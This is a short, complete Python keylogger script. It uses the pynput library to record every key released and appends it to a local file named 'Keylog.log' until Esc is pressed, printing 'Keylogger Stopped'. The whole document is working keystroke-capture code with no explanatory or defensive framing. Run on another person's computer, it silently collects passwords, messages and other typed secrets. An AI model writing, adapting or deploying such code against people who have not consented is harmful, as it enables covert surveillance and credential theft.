from pynput import keyboard as k

def log_writer(data):
    with open("Keylog.log","a")as file:file.write(str(data))

def writer(key):
    if(str(key)=="Key.esc"):
        print("Keylogger Stopped")
        return False
    try:
        log_writer(str(key.char))
    except Exception:
      log_writer("\n"+str(key)+"\n")
    return

log_writer("\nNew session started\n")
with k.Listener(on_release=writer)as l:
    l.join()
